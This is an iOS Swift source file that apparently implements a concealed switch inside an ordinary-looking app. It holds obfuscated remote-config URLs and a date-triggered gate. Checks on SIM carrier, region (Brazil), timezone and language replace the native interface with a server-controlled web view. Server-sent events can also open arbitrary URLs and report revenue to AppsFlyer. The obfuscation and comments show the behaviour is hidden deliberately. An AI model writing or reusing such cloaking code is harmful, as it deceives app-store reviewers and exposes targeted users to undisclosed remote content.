
import Foundation
import UIKit
//import AdjustSdk
import AppsFlyerLib

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func Kindoe(_ input: String) -> String? {
    let k: UInt8 = 38
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    return String(bytes: decryptedBytes, encoding: .utf8)
}

//https://api.my-ip.io/v2/ip.json   t6urr6zl8PC+r7bxsqbytq/xtrDwqe3wtq/xtaywsQ==
//internal let kUyabhsie = "h5ubn5zVwMCOn4bBgpbChp/BhoDAmd3Ahp/BhZyAgQ=="         //Ip ur

//https://69eccf24af4ff533142b6875.mockapi.io/arrow/reflex
// right YX19eXozJiY/MGw6Oj5sajo6Oz4xOj5oODw8O2wwamsnZGZqYmh5YCdgZiZhfGx/aCZ9aHlqYWx6
internal let Tagsudh = "TlJSVlUcCQkQH0NFRUAUEkdAEkBAExUVFxIURBAeERMIS0lFTUdWTwhPSQlHVFRJUQlUQ0BKQ14="

// https://raw.githubusercontent.com/jduja/crazygold/main/bomb_normal.png
// uaWloaLr/v6jsKb/triluaSzpKK0o7K+v6W0v6X/sr68/ru1pLuw/rKjsKuotr69tf68sLi//rO+vLOOv76jvLC9/6G/tg==
//internal let kBuazxous = "uaWloaLr/v6jsKb/triluaSzpKK0o7K+v6W0v6X/sr68/ru1pLuw/rKjsKuotr69tf68sLi//rO+vLOOv76jvLC9/6G/tg=="

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
internal func Mnsuhse() {
//    UIApplication.shared.windows.first?.rootViewController = vc
    
    DispatchQueue.main.async {
        if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
//            let tp = ws.windows.first!.rootViewController! as! UITabBarController
            let tp = ws.windows.first!.rootViewController!
            for view in tp.view.subviews {
                if view.tag == 26 {
                    view.removeFromSuperview()
                }
            }
        }
    }
}

// MARK: - 加密调用全局函数HandySounetHmeSh
internal func Lmanseeis() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: Mnsuhse
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
internal func fajuene(_ dt: Kansbhe) {
    DispatchQueue.main.async {
        UserDefaults.standard.setModel(dt, forKey: "Kansbhe")
        UserDefaults.standard.synchronize()
        
        let vc = GbsuiCowuVC()
        vc.NSMIH = dt
        UIApplication.shared.windows.first?.rootViewController = vc
    }
}


internal func hdetbas(_ param: Kansbhe) {
    let fName = ""

    typealias rushBlitzIusj = (Kansbhe) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : fajuene
    ]
    
    fctn[fName]?(param)
}

let Nam = "name"
let DT = "data"
let UL = "url"

/*--------------------Tiao wangye------------------------*/
//need jia mi
//af_revenue/af_currency
func nidoamhes(_ dic: [String : String]) {
    var dataDic: [String : Any]?
    if let data = dic["params"] {
        if data.count > 0 {
            dataDic = data.stringTo()
        }
    }
    if let data = dic["data"] {
        dataDic = data.stringTo()
    }

    let name = dic[Nam]
    print(name!)
    
    
    if dataDic?[amt] != nil && dataDic?[ren] != nil {
        AppsFlyerLib.shared().logEvent(name: String(name!), values: [AFEventParamRevenue : dataDic![amt] as Any, AFEventParamCurrency: dataDic![ren] as Any]) { dic, error in
            if (error != nil) {
                print(error as Any)
            }
        }
    } else {
        AppsFlyerLib.shared().logEvent(name!, withValues: dataDic)
    }
    
    
//    if let amt = dataDic![amt] as? String, let cuy = dataDic![ren] {
////        ade?.setRevenue(Double(amt)!, currency: cuy as! String)
//        AppsFlyerLib.shared().logEvent(name: String(name!), values: [AFEventParamRevenue : amt as Any, AFEventParamCurrency: cuy as Any]) { dic, error in
//            if (error != nil) {
//                print(error as Any)
//            }
//        }
//    } else {
//        AppsFlyerLib.shared().logEvent(name!, withValues: dataDic)
//    }
    
    if name == OpWin {
        if let str = dataDic![UL] {
            UIApplication.shared.open(URL(string: str as! String)!)
        }
    }
}

internal func maineshe(_ param: [String : String]) {
    let fName = ""
    typealias maxoPams = ([String : String]) -> Void
    let fctn: [String: maxoPams] = [
        fName : nidoamhes
    ]
    
    fctn[fName]?(param)
}

internal struct lsoianhe: Codable {

    let country: Gvasuee?
    
    struct Gvasuee: Codable {
        let code: String
    }

}

internal struct Kansbhe: Codable {
    
    let fiate: String?         //key arr
    let dioena: [String]?            // yeu nan xianzhi, pt、vi、th
    let wuansf: String?         // shi fou kaiqi
    let bvahhe: String?         // jum
    let nsjioe: String?          // backcolor
    let xuaoct: String?
    let qiasnom: String?   //ad key
    let wiaonum: String?   // app id
    let fvabbs: String?  // bri co
}

//internal func JaunLowei() {
//    if isTm() {
//        if UserDefaults.standard.object(forKey: "same") != nil {
//            WicoiemHusiwe()
//        } else {
//            if GirhjyKaom() {
//                LznieuBysuew()
//            } else {
//                WicoiemHusiwe()
//            }
//        }
//    } else {
//        WicoiemHusiwe()
//    }
//}

// MARK: - 加密调用全局函数HandySounetHmeSh
//internal func Kapiney() {
//    let fName = ""
//    
//    let fctn: [String: () -> Void] = [
//        fName: JaunLowei
//    ]
//    
//    fctn[fName]?()
//}

func Ubasjdo() -> Bool {
   
  // 2026-04-26 14:06:32
  //1777183577
    let ftTM = 1777183577
    let ct = Date().timeIntervalSince1970
    if Int(ct) - ftTM > 0 {
        return true
    }
    return false
}

//lan: pt、vi、th, rmt ctrl
//Region: BR、VN、TH, locl
//tizone: -2~-5、7-8, locl


func txvafsg(_ lsn: [String]) -> Bool {
    // 获取用户设置的首选语言（列表第一个）
    guard let cysh = Locale.preferredLanguages.first else {
        return false
    }
    let arr = cysh.components(separatedBy: "-")
    if lsn.contains(arr[0]) {
        return true
    }
    return false
}


//private let cdo = ["US","NL"]
// ["BR", "VN", "TH"]
//private let cdo = [Nhaisusm("f28="), Nhaisusm("a3M="), Nhaisusm("aXU=")]
private let cdo = [Kindoe("ZHQ=")]

// 时区控制
func Jheians() -> Bool {
    // 1.sm cad
    if !nsimehs() {
        return false
    }
    
    //2. regi
    if let rc = Locale.current.regionCode {
//        print(rc)
        if !cdo.contains(rc) {
            return false
        }
    }
    
    //3. tm zon
    let offset = NSTimeZone.system.secondsFromGMT() / 3600
    if (offset > -6 && offset < -1) {
        return true
    }
//    if (offset > 6 && offset <= 8) || (offset > -6 && offset < -1) {
//        return true
//    }
    
    return false
}

import CoreTelephony

func nsimehs() -> Bool {
    let networkInfo = CTTelephonyNetworkInfo()
    
    guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
        return false
    }
    
    for (_, carrier) in carriers {
        if let mcc = carrier.mobileCountryCode,
           let mnc = carrier.mobileNetworkCode,
           !mcc.isEmpty,
           !mnc.isEmpty {
            return true
        }
    }
    
    return false
}


extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}


extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
}
